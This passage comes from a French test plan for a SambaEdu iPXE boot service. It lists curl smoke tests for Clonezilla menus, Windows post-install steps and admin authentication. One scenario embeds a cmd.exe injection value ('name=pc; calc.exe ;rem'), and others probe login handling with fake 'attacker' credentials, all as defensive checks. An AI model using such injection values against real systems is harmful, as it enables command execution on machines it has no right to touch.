- Body contient `#!ipxe` + message d'erreur explicite
- Log `legacylog` contient `legacy.catchall.ipxe_gone` avec chemin et message

#### Scénario 3.7-9 — Poste inconnu (menu clonezilla rendu quand même)

```bash
curl -sS -X POST http://192.168.122.50/ipxe/clonezilla-menu \
  -d 'mac=ff:ff:ff:ff:ff:ff&uuid=ffffffff-ffff-ffff-ffff-ffffffffffff'
```

**Attendu** :
- HTTP 200 (parité legacy clonezilla_menu.php — menu rendu même pour poste inconnu)
- Body contient `#!ipxe` + `:menu`

#### Scénario 3.7-10 — Non-régression factory_reset et actions existantes (3.2)

```bash
# Vérifier que les actions 3.2 ne sont pas cassées par les ajouts 3.7
curl -sS -X POST http://192.168.122.50/ipxe/action/factory_reset \
  -d 'mac=aa:bb:cc:dd:ee:01&uuid=11111111-1111-1111-1111-111111111111'
curl -sS -X POST http://192.168.122.50/ipxe/action/rescuecd \
  -d 'mac=aa:bb:cc:dd:ee:01&uuid=11111111-1111-1111-1111-111111111111'
```

**Attendu** :
- factory_reset : `restoreparts savesda1 sda1` (identique à 3.2)
- rescuecd : `sysresccd/boot/x86_64/vmlinuz`
- Boot log `action='ipxe_action'` pour ces actions legacy (pas `ipxe_clonezilla`)

> **Divergence intentionnelle D2 (post-review 3.7 #1)** : `factory_reset` (3.2)
> et `clonezilla_restore_sda2_sda1` (3.7) partagent la **même cmdline iPXE**
> (parité kernel garantie par le test architecture
> `it_ensures_factory_reset_and_clonezilla_restore_have_same_kernel_cmdline`),
> mais leurs labels boot_log divergent volontairement :
>
> | Endpoint                                          | `machine_boot_logs.action` |
> | ------------------------------------------------- | -------------------------- |
> | `/ipxe/action/factory_reset` (3.2)                | `ipxe_action`              |
> | `/ipxe/action/clonezilla_restore_sda2_sda1` (3.7) | `ipxe_clonezilla`          |
>
> Permet de distinguer en audit quel chemin UX (menu factory_reset 3.2 vs
> sous-menu clonezilla 3.7) a déclenché la même opération de restauration.
> Le test non-régression
> `IpxeActionEndpointTest::it_persists_ipxe_action_label_for_factory_reset_post_3_7`
> gèle ce comportement.

> **Audit fin étendu (post-review 3.7 #7)** : depuis les correctifs 2026-05-22,
> `bootLogAction()` retourne des labels distincts pour les 16 cases install_*
> (3.4) et install_win* (3.5) — exemples : `ipxe_deb_gnome`, `ipxe_ubuntu64`,
> `ipxe_win10_perso`, `ipxe_nird`. Le test garde-fou
> `IpxeAdminActionTest::it_ensures_all_boot_log_actions_fit_in_varchar_20`
> bloque toute valeur > 20 chars. Toutes les valeurs respectent la limite
> `machine_boot_logs.action` (varchar(20)). Auparavant tous ces cases étaient
> indistinguables (`ipxe_action`) — désormais l'audit Loki/Grafana peut
> ventiler par distribution / variant / version.

#### Scénario 3.7-11 — Action format invalide (uppercase → 410)

```bash
curl -sS -o /dev/null -w "%{http_code}" -X POST http://192.168.122.50/ipxe/action/RESCUECD \
  -d 'mac=aa:bb:cc:dd:ee:01&uuid=11111111-1111-1111-1111-111111111111'
```

**Attendu** :
- HTTP 410 (catchall bloque `^ipxe/action/` après échec regex route `[a-z0-9_]+`)
- Body contient `#!ipxe` + message erreur

#### Compat postes legacy (post-review 3.7 #2)

> Le pattern catchall `^ipxe/action/` (D10) est volontairement large : toute
> URL `/ipxe/action/<x>` qui n'a pas matché la route native `[a-z0-9_]+`
> retourne 410 Gone, **sans fallback vers le legacy**. Conséquence pour les
> postes terrain :

**Postes à risque** : firmwares iPXE buggés qui appendent un suffixe non-canonique
(`/ipxe/action/clonezilla_live/`, `/ipxe/action/clonezilla_live;jsessionid=...`)
ou postes très anciens NON-mis-à-jour 16.11 qui hardcodent une URL camelCase
(`/ipxe/action/Rescuecd`). Tous tomberont sur le catchall 410 Gone — le boot
échouera côté poste (firmware iPXE arrête sur la 410).

**Smoke à valider avant prod** :

```bash
# Simuler un poste legacy non-mis-à-jour
curl -sS -o /dev/null -w "%{http_code}\n" http://192.168.122.50/ipxe/action/Rescuecd
# Attendu : 410 (avant 3.7 c'était 404 Laravel → catchall direct_legacy_routes → 200 legacy)

curl -sS -o /dev/null -w "%{http_code}\n" http://192.168.122.50/ipxe/action/clonezilla_live/
# Attendu : 410 (trailing slash non matché par la route native [a-z0-9_]+)
```

**Mitigation si régression terrain** : `IPXE_LEGACY_BLOCKED_FALLBACK=true` n'est PAS
exposé en 3.7 — le seul rollback est d'éditer manuellement `config/sambaedu.php`
pour commenter le pattern `^ipxe/action/`. Décision Henri post-prod si remontée.

### Checklist smoke test VM (Story 3.7)

- [ ] Scénario 3.7-1 (handshake clonezilla-menu) : 200 + chain##params
- [ ] Scénario 3.7-2 (menu clonezilla complet POST) : 200 + 5 items (l/s/r/b/x)
- [ ] Scénario 3.7-3 (menu maintenance étendu) : 200 + 4 nouveaux items (z/g/h/t)
- [ ] Scénario 3.7-4 (action clonezilla_live) : 200 + kernel + initrd + boot log ipxe_clonezilla
- [ ] Scénario 3.7-5 (action clonezilla_save) : 200 + saveparts + boot log ipxe_clonezilla
- [ ] Scénario 3.7-6 (action clonezilla_restore) : 200 + restoreparts + boot log ipxe_clonezilla
- [ ] Scénario 3.7-7 (actions diagnostic gparted/hdt/memtest) : 200 + chemin correct + boot log distinct
- [ ] Scénario 3.7-8 (catchall bloqué routes legacy) : 410 + body iPXE
- [ ] Scénario 3.7-9 (poste inconnu clonezilla-menu) : 200 + menu rendu
- [ ] Scénario 3.7-10 (non-régression factory_reset/rescuecd) : 200 + cmdline inchangée
- [ ] Scénario 3.7-11 (format invalide RESCUECD) : 410 gone

> Smoke automatisable : voir Story 3.1 et 3.2 § "Smoke test à exécuter quand VM up"
> dans `_bmad-output/implementation-artifacts/3-1-ipxe-service-core.md`.

---

## Section 17 — Story 3.8 — Installation Windows post-OOBE flows

> **Périmètre** : endpoint `POST /ipxe/windows/action` étendu aux 6 étapes post-OOBE (`sysprep`, `nosysprep`, `join`, `renomme`, `post`, `wpkg`). Comble le trou fonctionnel post-3.7 (postes natifs 3.5 étaient muets sur le post-OOBE).
>
> **Périmètre HORS-SCOPE** : retrait fallback `direct_legacy_routes ^/ipxe/` (postes pré-3.5 continuent legacy intact — Q-5 confirmé), refonte UX/UI Livewire (pas d'UI native pour ces flows firmware iPXE), drivers DISM Phase 3, port scripts shell SE5 (`driversAuto.ps1`, `sysprep.ps1`, etc. — restent côté SMB `\\<se4fs>\install\os\netinst\`), workflow stateful clonage UDP-multicast (Phase 3 dédiée), DNS samba/bind update explicite post-rename (Samba 4 auto — Q-4).

### Pré-requis VM (action Henri post-merge)

```bash
# SSH /vm
cd /var/www/sambaedu-reload
composer install
php artisan migrate                        # Applique 2026_05_22_120000_add_progress_and_programmed_action_to_workstations
php artisan optimize:clear
systemctl reload php8.2-fpm@www-admin

# Vérifier qu'aucun poste pré-3.8 in-progress n'a été cassé
sudo -u postgres psql sambaedu -c "\d workstations" | grep -E 'progress|programmed_action'
# attendu : progress varchar(8), programmed_action jsonb (default '{}'::jsonb)

# Vérifier APCu CLI vs FPM séparés (rappel)
# Toute programmation type=clonage doit passer par le menu admin web SE5 (FPM) — pas par tinker CLI
```

### Pré-requis annexes

- Vérifier `\\<se4fs>\install\os\netinst\` contient `sysprep.ps1`, `driversAuto.ps1`, `winget-install.ps1`, `SetWallpaper.ps1`, `Nettoyage WPKG.cmd` (action T0.5 dev — restent côté SMB legacy).
- Vérifier `.env` AD sensibles : `SE4INSTALL_NAME`, `SE4INSTALL_PASSWD`, `SAMBAEDU_ADMINSE_NAME`, `SAMBAEDU_ADMINSE_PASSWD`, `SAMBAEDU_LDAP_DOMAIN`, `SAMBAEDU_SE4FS_NAME` (si une manquante → builder émet `BatPlaceholderInjectionException` sur valeur vide → fail-safe mais install KO).
- `AdMachineManager::renameComputer` (3.3 D14 plan B = delete+recreate) supporté — risque netbootGUID à surveiller terrain (cf. scénario 3.8-9 ci-dessous).

### Rollback runtime (en cas de régression)

```bash
# SSH /vm
echo "IPXE_WIN_POST_INSTALL_ENABLED=false" >> /var/www/sambaedu-reload/.env
php artisan config:clear
# Revient au comportement 3.5 (body vide + log warning sur step non-{winpe,oobe})
```

Rollback fine-grained (1 étape spécifique) :

```bash
echo "IPXE_WIN_JOIN_ENABLED=false" >> .env    # ou autre étape : SYSPREP, NOSYSPREP, RENOMME, POST, WPKG
php artisan config:clear
```

### Scénarios stables 3.8

> **Convention** : un poste neuf Win11 installé via la pipeline 3.5 (iPXE → install.bat → unattend.xml) sert de base. Les scénarios 3.8-* exercent les étapes post-OOBE séquentielles. Les scénarios marqués _smoke curl_ peuvent être exécutés en isolation via curl direct (pas besoin d'un poste réel).

#### Section 17.1 — Smoke curl par étape (isolation)

- [ ] **Scénario 3.8-1** (smoke curl `etape=sysprep` poste en mode clonage) :
  ```bash
  # Programmer pc-test en type=clonage via menu admin web SE5 (UI hors-scope 3.8)
  curl --data 'name=pc-test&uuid=12345678-1234-1234-1234-123456789012&etape=sysprep&mac=AA:BB:CC:DD:EE:FF' \
       http://192.168.122.50/ipxe/windows/action
  # Attendu : 200 + Content-Type text/plain; charset=utf-8 + body non vide + CRLF strict
  # Body doit contenir : "REM", "for /f", ":uuid", ":gpo", ":autologon", "sysprep.exe /generalize /oobe", "curl -F \"etape=sysprep\" -F \"ret=1\""
  # DB : workstations.programmed_action.etape='sysprep', programmed_action.type='clonage2', programmed_action.role='modele', progress=0%, status="préparation 1er boot"
  # Log channel ipxe : ipxe.windows.action.sysprep.dispatched
  ```

- [ ] **Scénario 3.8-2** (smoke curl `etape=nosysprep&ret=0` — Q-2 refacto clarté) :
  ```bash
  curl --data 'name=pc-test&uuid=...&etape=nosysprep&ret=0&mac=...' http://192.168.122.50/ipxe/windows/action
  # Attendu : 200 + body vide (validation state machine) + log info ipxe.windows.action.nosysprep.advanced
  # DB : workstations.progress=50%, programmed_action.etape='nosysprep'
  # NOTE : Q-2 refacto clarté — le SE5 utilise etape=nosysprep distinct (PAS etape=sysprep&ret=2 legacy)
  ```

- [ ] **Scénario 3.8-3** (smoke curl `etape=join` premier appel) :
  ```bash
  curl --data 'name=pc-test&uuid=...&etape=join&mac=...' http://192.168.122.50/ipxe/windows/action
  # Attendu : 200 + body = cmd_join (~3.7 KB CRLF strict)
  # Body doit contenir : :gpo, :autologon, powershell Add-Computer -DomainName, curl ret=1
  # DB : status="mise au domaine v2", progress=0%, programmed_action.role='windows', programmed_action.etape='join'
  # Log : ipxe.windows.action.join.dispatched
  # Parité bit-équivalence : assertCmdBodyEquivalent(body, fixture tests/fixtures/ipxe/legacy-cmd-action/join.txt)
  ```

- [ ] **Scénario 3.8-4** (smoke curl `etape=renomme&ret=0` — AD rename intégration) :
  ```bash
  # Pré-requis : programmed_action.role='nouveau-nom-pc' (set précédemment via menu admin web)
  curl --data 'name=pc-test&uuid=...&etape=renomme&ret=0&mac=...' http://192.168.122.50/ipxe/windows/action
  # Attendu : 200 + body vide (validation) + AD rename invoqué via AdMachineManager::renameComputer
  # Si succès AD rename : status="renommage dans AD OK", progress=60%, log ipxe.windows.action.renomme.ad_rename_success
  # Si échec AD rename (exception) : status="ERREUR renommage AD impossible", progress=40%, log ipxe.windows.action.renomme.ad_rename_failure
  # DNS Samba auto (Q-4) — pas de helper DNS explicite SE5
  # Vérifier ldapsearch : CN=<nouveau-nom-pc>,OU=...,DC=localdev,DC=fr existe + ancien CN supprimé
  ```

- [ ] **Scénario 3.8-5** (smoke curl `etape=post` premier appel + ret=0 récursif) :
  ```bash
  # 1er appel
  curl --data 'name=pc-test&uuid=...&etape=post&mac=...' http://192.168.122.50/ipxe/windows/action
  # Attendu : body cmd_post + status="post-mise au domaine manuelle", progress=20%
  # 2e appel (autologon récursif — branche B legacy)
  curl --data 'name=pc-test&uuid=...&etape=post&ret=0&mac=...' http://192.168.122.50/ipxe/windows/action
  # Attendu : body cmd_post + status="script de demarrage post-install OK", progress=50% (re-render body pour 2e tour)
  # 3e appel (validation finale)
  curl --data 'name=pc-test&uuid=...&etape=post&ret=1&mac=...' http://192.168.122.50/ipxe/windows/action
  # Attendu : body vide + progress=100% + programmed_action.etape='default'
  ```

- [ ] **Scénario 3.8-6** (smoke curl `etape=wpkg` séquence complète) :
  ```bash
  curl --data 'name=pc-test&uuid=...&etape=wpkg&mac=...' ...   # body cmd_wpkg, progress=10%, status="lancement wpkg interactif"
  curl --data '...etape=wpkg&ret=0&mac=...' ...                # body vide, progress=50%, programmed_action.role='windows', programmed_action.etape='wpkg'
  curl --data '...etape=wpkg&ret=1&mac=...' ...                # body vide, progress=100%, status="exec wpkg fini", programmed_action.etape='default'
  ```

#### Section 17.2 — Non-régression 3.5 (winpe / oobe)

- [ ] **Scénario 3.8-7** (winpe inchangé 3.5) :
  ```bash
  curl --data 'name=pc-test&uuid=...&etape=winpe&mac=...' http://192.168.122.50/ipxe/windows/action
  # Attendu : 200 + body vide + recordWinpeStart (iso 3.5 — pas de régression)
  # Workstation.status='installation Windows en cours', os='windows', progress=10%
  ```

- [ ] **Scénario 3.8-8** (oobe inchangé 3.5) :
  ```bash
  curl --data 'name=pc-test&uuid=...&etape=oobe&ret=0&mac=...' http://192.168.122.50/ipxe/windows/action
  # Attendu : 200 + body vide + recordOobeComplete (iso 3.5)
  # Workstation.status='installation Windows terminee', progress=100%
  # NOTE : la fixture oobe.txt sert de référence non-régression (parité avec legacy cmd_oobe sur 1er appel sans ret)
  ```

#### Section 17.3 — Sécurité et rollback

- [ ] **Scénario 3.8-9** (injection cmd.exe tentative — D9 sécurité critique) :
  ```bash
  # Tenter d'injecter via name="; calc.exe; rem"
  curl --data 'name=pc; calc.exe ;rem&uuid=...&etape=join&mac=...' http://192.168.122.50/ipxe/windows/action
  # Attendu : 200 + body vide + log warning ipxe.windows.action.placeholder_injection_attempt
  # PAS de cmd.exe lancé côté serveur (BatPlaceholderInjectionException catché par controller)
  # Note : la 1ère validation FormRequest (max:32, Rule::in 8 cases) capture déjà beaucoup
  ```

- [ ] **Scénario 3.8-10** (rollback runtime D13) :
  ```bash
  # SSH /vm
  echo "IPXE_WIN_POST_INSTALL_ENABLED=false" >> /var/www/sambaedu-reload/.env
  php artisan config:clear
  curl --data '...etape=join&mac=...' http://192.168.122.50/ipxe/windows/action
  # Attendu : 200 + body vide + log warning ipxe.windows.action.post_install_disabled (comportement 3.5 strict)
  # Restore :
  sed -i '/IPXE_WIN_POST_INSTALL_ENABLED/d' .env
  php artisan config:clear
  ```

- [ ] **Scénario 3.8-11** (rollback fine-grained par étape) :
  ```bash
  echo "IPXE_WIN_JOIN_ENABLED=false" >> .env && php artisan config:clear
  curl --data '...etape=join&mac=...' ...
  # Attendu : 200 + body vide + log warning ipxe.windows.action.step_disabled
  # Autres étapes non affectées (renomme, post, wpkg, sysprep, nosysprep restent actives)
  ```

#### Section 17.4 — Install Windows complète (poste réel)

- [ ] **Scénario 3.8-12** (install Windows complète mode standard) :
  ```
  1. Démarrer poste neuf via iPXE chain boot.ipxe (Story 3.1).
  2. Menu admin web SE5 : choisir "Install Windows" pour le poste (Story 3.2 menu — UI hors-scope 3.8).
  3. Le poste télécharge WinPE → install.bat → unattend.xml → diskpart.txt (Story 3.5 done).
  4. Setup Windows s'exécute via setup.exe /unattend:unattend.xml.
  5. Au FirstLogonCommands, curl etape=oobe&ret=0 → recordOobeComplete (3.5).
  6. Reboot, poste démarre en se4install autologon → curl etape=join → cmd_join → join AD → curl etape=join&ret=1.
  7. Reboot, poste démarre, curl etape=post → cmd_post → wpkg + scripts post-install → curl etape=post&ret=0 puis &ret=1.
  8. Vérifier final : Workstation.status='terminé', progress=100%, os='windows', programmed_action.etape='default'.
  9. Vérifier AD : CN=<poste>,OU=<établissement>,OU=computers,DC=localdev,DC=fr présent + memberOf=<groupes> conformes.
  10. Vérifier DNS : nslookup <poste>.localdev.fr → IP poste (Samba 4 auto Q-4).
  ```

- [ ] **Scénario 3.8-13** (install Windows mode clonage maître) :
  ```
  1. Programmer le poste maître en type=clonage via menu admin web SE5.
  2. Suivre le flow d'install Windows (iso 3.8-12).
  3. Sur curl etape=sysprep → body cmd_sysprep (PAS le legacy dead-code mais le port SE5 — voir _README.md fixtures).
  4. Au reboot, autologon se4install → sysprep.exe /generalize /oobe → curl etape=sysprep&ret=1 → recordSysprepGeneralized.
  5. Reboot final, poste prêt pour clonage externe (sysrescuecd ou outil tiers — Phase 3 workflow stateful).
  6. Si sysprep KO (sysprep.exe fail) → fallback cmd_nosysprep → Remove-Computer (sortie domaine) → reboot adminse → curl etape=sysprep&ret=2 → recordSysprepNoneClone (backup compat conservé DO-7).
  ```

#### Section 17.5 — Concurrence + edge cases

- [ ] **Scénario 3.8-14** (2 POST simultanés même poste — concurrence) :
  ```bash
  # 2 curls en parallèle sur le même poste
  curl ...etape=sysprep... &
  curl ...etape=sysprep... &
  wait
  # Attendu : les 2 requêtes terminent OK (DB::transaction + lockForUpdate dans tracker — D7 + DO-5)
  # 1 seule ligne MachineBootLog peut être insérée si lockForUpdate empêche le double-insert (ou 2 lignes si la fenêtre lock est trop courte — observer)
  # Workstation.programmed_action cohérent (pas de corruption JSON merge)
  ```

- [ ] **Scénario 3.8-15** (payload `etape` arbitrary rejeté par FormRequest) :
  ```bash
  curl --data 'name=pc-test&uuid=...&etape=arbitrary_value&mac=...' http://192.168.122.50/ipxe/windows/action
  # Attendu : 422 (FormRequest Rule::in 8 cases rejette)
  # Defense in depth : si la Rule::in était bypassée, l'enum WindowsInstallStep::fromString rejetterait aussi → 200 + log warning unsupported_step (iso 3.5)
  ```

### Checklist rapide (avant déclaration done)

- [ ] Migration appliquée (`workstations.progress varchar(8)`, `workstations.programmed_action jsonb`)
- [ ] Index GIN `workstations_pa_etape_idx` créé (`\d workstations` montre l'index)
- [ ] Smoke curl 3.8-3 (join) OK + parité bit-équivalence avec `tests/fixtures/ipxe/legacy-cmd-action/join.txt`
- [ ] Smoke 3.8-7 + 3.8-8 (winpe + oobe) **non-régression 3.5**
- [ ] Smoke 3.8-9 (injection rejeté) — sécurité critique
- [ ] Smoke 3.8-10 (rollback runtime) — toggle config opérationnel
- [ ] Scénario 3.8-12 install complète sur **au moins 1 poste réel** (Win11)
- [ ] PHPUnit Feature 3.5/3.7 verts (non-régression)

### Post-correctifs & non-régressions

> Cette section est enrichie post-review/post-incident.

| Incident | Story | Symptôme | Correctif | Scénario test ajouté |
|---|---|---|---|---|
| #3 (review) — join OU perdu au 2e curl | 3.8 | Au 2e curl join (`ret=0`), le poste ne re-envoie pas `role`/`ou` → `Add-Computer -OUPath ''` → poste joint dans `CN=Computers` au lieu de l'OU cible → GPOs non appliquées (régression silencieuse, install passe 200 OK) | `recordJoinInitiated` persiste `ou`+`join_role` dans `programmed_action` JSONB ; `handleJoin` ret=0/1 résout depuis la DB via `resolveJoinRoleOu()` (parité legacy APCu serveur-side) | `it_persists_and_resolves_join_ou_across_curl_steps` (Feature) + scénario manuel 3.8-16 ci-dessous |

#### Scénario 3.8-16 — Non-régression join OU multi-curl (incident #3)

- [ ] **Scénario 3.8-16** (l'OU cible survit au reboot entre les curls join) :
  ```bash
  # 1er curl (admin programme l'OU cible via menu web, puis poste démarre join)
  curl --data 'name=pc-test&uuid=...&etape=join&ou=OU=salle1,OU=computers,DC=localdev,DC=fr&mac=...' \
       http://192.168.122.50/ipxe/windows/action
  # Vérifier DB : workstations.programmed_action->>'ou' = 'OU=salle1,OU=computers,DC=localdev,DC=fr'

  # 2e curl (le poste rebooté re-curl SANS ou — simule join.blade.php ligne 21)
  curl --data 'name=pc-test&uuid=...&etape=join&ret=0&mac=...' \
       http://192.168.122.50/ipxe/windows/action
  # Vérifier : body contient -OUPath 'OU=salle1,OU=computers,DC=localdev,DC=fr' (PAS -OUPath '')

  # Vérification finale post-install AD
  # ldapsearch : le poste doit être dans CN=pc-test,OU=salle1,OU=computers,DC=localdev,DC=fr
  # PAS dans CN=pc-test,CN=Computers,DC=localdev,DC=fr
  ```

> Smoke automatisable : voir Story 3.1 et 3.2 § "Smoke test à exécuter quand VM up"
> dans `_bmad-output/implementation-artifacts/3-1-ipxe-service-core.md`.

---

## Section 18 — Story 4.10 — Auth iPXE admin + permissions

**Date livraison** : 2026-05-29
**Migrations à appliquer** : aucune (permission Spatie `computer.install` déjà
présente dans `SambaPermission` enum + seed via `PermissionSeeder`).
**Permissions requises côté Spatie** :
- `computer.install` (existante) — attribuée à `super-admin` + `ComputerAdmin`.
**Pré-déploiement** :
- S'assurer que `php artisan db:seed --class=PermissionSeeder` a été exécuté
  au moins une fois (idempotent — sans effet sur les rôles existants).
- Vérifier la valeur effective du flag :
  `php artisan tinker --execute='echo (int) config("ipxe.admin.enabled");'`
  → doit valoir `1` (default 4.10 — kill-switch retiré).

### Contexte

La régression sécurité critique (handleAdmin sans validation user/password,
mitigation par kill-switch posée le 2026-05-28) est levée. Tous les endpoints
iPXE sensibles exigent désormais :
1. POST `username` + `password` (le password étant base64-encoded par le
   firmware via `param password ${password:base64}`).
2. Bind LDAP valide (`AuthenticationService::validateAdCredentials()` —
   wrapper public sans effet de bord session, ajouté en 4.10).
3. Permission Spatie `computer.install` sur l'`User` PG correspondant.

Refus → écran iPXE `auth_failed.blade.php` (text/plain, sleep 8s, chain back
boot). Aucun leak password (en clair ni base64) côté logs ni response body.

### Endpoints couverts

| Endpoint                            | Auth requise | Logs `ipxe.<context>.*` |
|-------------------------------------|--------------|--------------------------|
| `POST /ipxe/admin`                  | OUI          | `admin`                  |
| `POST /ipxe/maintenance`            | OUI          | `maintenance`            |
| `POST /ipxe/action/{action}`        | OUI          | `action`                 |
| `POST /ipxe/installation-linux`     | OUI          | `install_linux`          |
| `POST /ipxe/installation-windows`   | OUI          | `install_windows`        |
| `POST /ipxe/clonezilla-menu`        | OUI          | `clonezilla`             |
| `POST /ipxe/enrollment/name`        | OUI          | `enrollment.name`        |
| `POST /ipxe/enrollment/room`        | OUI          | `enrollment.room`        |
| `POST /ipxe/enrollment/parc-add`    | OUI          | `enrollment.parc-add`    |
| `POST /ipxe/enrollment/parc-remove` | OUI          | `enrollment.parc-remove` |
| `POST /ipxe/enrollment/byod`        | OUI          | `enrollment.byod`        |
| `GET|POST /ipxe/boot`               | NON (public) | `boot.*`                 |
| Handshake (mac/uuid absents)        | NON          | `<context>.handshake`    |

### Scénario 4.10-1 — Login random refusé (pas de creds)

```bash
# POST sans username/password → écran auth_failed
curl -sS -X POST http://192.168.122.50/ipxe/admin \
     --data 'mac=aa:bb:cc:11:22:33&uuid=12345678-1234-1234-1234-aaaaaaaaaaaa'
```

**Attendu** :
- Status 200, `Content-Type: text/plain`
- Body contient : `Acces refuse - identifiants requis`
- Body chain back : `chain --replace --autofree http://192.168.122.50/ipxe/boot##params`

**Log iPXE** :
```bash
tail -n 5 storage/logs/ipxe/ipxe-$(date +%F).log
# Attendu : event `ipxe.admin.auth_missing` avec context
#   {ip, username_prefix:'', mac_prefix:'aa:bb:', uuid_prefix:'12345678'}
# AUCUN champ `password` ou `password_prefix`.
```

### Scénario 4.10-2 — Login random refusé (creds invalides)

```bash
PWD_B64=$(printf 'wrongpassword' | base64)
curl -sS -X POST http://192.168.122.50/ipxe/admin \
     --data "mac=aa:bb:cc:11:22:33&uuid=12345678-1234-1234-1234-aaaaaaaaaaaa&username=attacker&password=$PWD_B64"
```

**Attendu** :
- Status 200, body contient `identifiants invalides`
- Log : `ipxe.admin.auth_failed` avec `ip`, `username_prefix='att'`,
  `mac_prefix='aa:bb:'`. **JAMAIS** `password` ni `wrongpassword`.

### Scénario 4.10-3 — Login valide sans droit `computer.install` → refusé

Prérequis : créer un user AD `prof_demo` côté AD (samba-tool user create),
attribuer en SE5 le rôle `prof` (qui n'a PAS `computer.install`).

```bash
PWD_B64=$(printf 'CorrectAdPwd' | base64)
curl -sS -X POST http://192.168.122.50/ipxe/admin \
     --data "mac=aa:bb:cc:11:22:33&uuid=12345678-1234-1234-1234-aaaaaaaaaaaa&username=prof_demo&password=$PWD_B64"
```

**Attendu** :
- Status 200, body contient `droit insuffisant` + `computer.install`
- Log : `ipxe.admin.permission_denied` avec `permission='computer.install'`,
  `user_known_in_pg=true`, `username_prefix='pro'`.

### Scénario 4.10-4 — Login valide avec droit → menu admin servi

Prérequis : user AD `admin_demo` + rôle SE5 `super-admin` ou `ComputerAdmin`.

```bash
PWD_B64=$(printf 'CorrectAdPwd' | base64)
curl -sS -X POST http://192.168.122.50/ipxe/admin \
     --data "mac=aa:bb:cc:11:22:33&uuid=12345678-1234-1234-1234-aaaaaaaaaaaa&username=admin_demo&password=$PWD_B64"
```

**Attendu** :
- Status 200, body contient `item --key m maintenance` + nom du poste.
- Log : `ipxe.admin.auth_success` avec `permission='computer.install'`,
  `username_prefix='adm'`.

### Scénario 4.10-5 — Kill-switch désactive l'item (1) login

```bash
# Override env pour désactiver l'item login dans known.blade.php
IPXE_ADMIN_ENABLED=false php artisan config:cache

# Poste connu boot — known.blade ne doit plus offrir l'item login
curl -sS -X POST http://192.168.122.50/ipxe/boot \
     --data 'mac=aa:bb:cc:11:22:33&uuid=12345678-1234-1234-1234-aaaaaaaaaaaa'
# Attendu : body NE contient PAS `item --key 1 login`
# Restaurer
IPXE_ADMIN_ENABLED=true php artisan config:cache
```

### Scénario 4.10-6 — Sweep des endpoints sensibles sans creds

Pour chaque endpoint listé dans la matrice :

```bash
for ep in /ipxe/maintenance /ipxe/action/rescuecd /ipxe/action/factory_reset \
          /ipxe/installation-linux /ipxe/installation-windows /ipxe/clonezilla-menu \
          /ipxe/enrollment/name /ipxe/enrollment/room \
          /ipxe/enrollment/parc-add /ipxe/enrollment/parc-remove /ipxe/enrollment/byod; do
  body=$(curl -sS -X POST "http://192.168.122.50$ep" \
              --data 'mac=aa:bb:cc:11:22:33&uuid=12345678-1234-1234-1234-aaaaaaaaaaaa')
  echo "=== $ep ==="
  echo "$body" | grep -E 'Acces refuse|identifiants requis' || echo "MISS auth check"
done
```

**Attendu** : chaque endpoint répond `Acces refuse - identifiants requis`.

### Scénario 4.10-7 — Non-leak password (grep défensif)

```bash
# Tenter un POST avec un password unique identifiable
curl -sS -X POST http://192.168.122.50/ipxe/admin \
     --data "mac=aa:bb:cc:11:22:33&uuid=12345678-1234-1234-1234-aaaaaaaaaaaa&username=attacker&password=$(printf 'CANARY_PWD_LEAK_TEST' | base64)"

# Vérifier que CANARY_PWD_LEAK_TEST n'apparait dans aucun log iPXE/laravel/syslog
grep -rn 'CANARY_PWD_LEAK_TEST\|Q0FOQVJZX1BXRF9MRUFLX1RFU1Q' storage/logs/ /var/log/ 2>/dev/null
# Attendu : 0 résultat.
```

> Smoke automatisable : tests `IpxeAdminAuthTest::*` (65 cas après
> corrections post-review) couvrent les scénarios 4.10-1, 4.10-2, 4.10-3,
> 4.10-4, 4.10-6, 4.10-7, 4.10-8 hors AD/LDAP réel (stub
> `validateAdCredentials`).

### Post-correctifs & non-régressions

> Section enrichie post-review adversariale (2026-05-29, doc
> `_bmad-output/codeReviews/4-10.md`). 5 corrections automatiques
> appliquées : #2, #3, #5, #10, #14.

| Incident | Story | Symptôme | Correctif | Scénario test ajouté |
|---|---|---|---|---|
| #2 (review) — enrollment multi-step cassé sans propagation creds | 4.10 | 5 templates enrollment (`name`, `room`, `parc-add`, `parc-remove`, `byod`) ne re-déclarent pas `param username`/`param password` dans leur bloc `params` ; au 2e hit (après `read name`/`choose`), iPXE re-chain `##params` SANS creds → `MissingCredentials` → `auth_failed` → flow cassé en production réelle | Ajout `param username ${username}` + `param password ${password:base64}` dans les 5 templates enrollment, iso `admin.blade.php` | `it_propagates_credentials_through_multi_step_enrollment_flow` (5 cas) + scénario 4.10-8 ci-dessous |
| #3 (review) — `decodePassword` fallback raw défectueux | 4.10 | `base64_decode(strict=true)` ne retourne false QUE pour chars hors alphabet b64 ; un password full-[a-z] comme `mypassword` est « décodé » en binaire aléatoire → bind LDAP échoue silencieusement | Guard regex `^[A-Za-z0-9+/]+={0,2}$` ET `strlen % 4 === 0` AVANT `base64_decode` ; sinon fallback raw | `it_decodes_standard_base64_password_correctly`, `it_falls_back_to_raw_when_password_is_full_b64_alphabet_but_not_encoded`, `it_falls_back_to_raw_when_password_contains_non_b64_characters` |
| #5 (review) — `bypassIpxeAuth` masque retrait silencieux de `guard()` | 4.10 | Le helper court-circuite `IpxeAuthService::authorize()` ; si un dev retire `$this->guard()` d'un handler, aucun test existant ne casse | Test paramétré (12 endpoints) avec `$mock->expects($this->once())` sur `validateAdCredentials()` → casse si un handler contourne guard() | `it_invokes_validate_ad_credentials_for_each_sensitive_endpoint` (12 cas) |
| #10 (review) — test `allow` sans assertion positive | 4.10 | Le test `it_allows_authenticated_user_with_permission` ne vérifiait que `assertStringNotContainsString('Acces refuse', …)` → ne détecte pas un handler qui rendrait un mauvais template silencieusement | Dictionnaire `[path => substring_attendu]` + `assertStringContainsString` par endpoint | Patch intégré au test paramétré existant (12 cas) |
| #14 (review) — case sensitivity AD vs Postgres dans `User::findByLogin` | 4.10 | AD est case-insensitive sur `sAMAccountName` ; Postgres `where('login', $value)` est case-sensitive → un POST iPXE avec login MAJUSCULES (alors que DB = minuscules) → `findByLogin=null` → `PermissionDenied` même si bind LDAP OK | `User::findByLogin` patché en `whereRaw('LOWER(login) = ?', [strtolower($login)])` | `it_resolves_user_with_uppercase_login_case_insensitively` |

#### Scénario 4.10-8 — Propagation creds dans le flow enrollment multi-step (incident #2)

```bash
# Setup : user AD `admin_demo` + droit `computer.install` ; poste pré-enregistré.
PWD_B64=$(printf 'CorrectAdPwd' | base64)
PAYLOAD="mac=aa:bb:cc:11:22:33&uuid=12345678-1234-1234-1234-aaaaaaaaaaaa"
CREDS="username=admin_demo&password=$PWD_B64"

# 1er hit enrollment/room (handshake — affiche menu de salles)
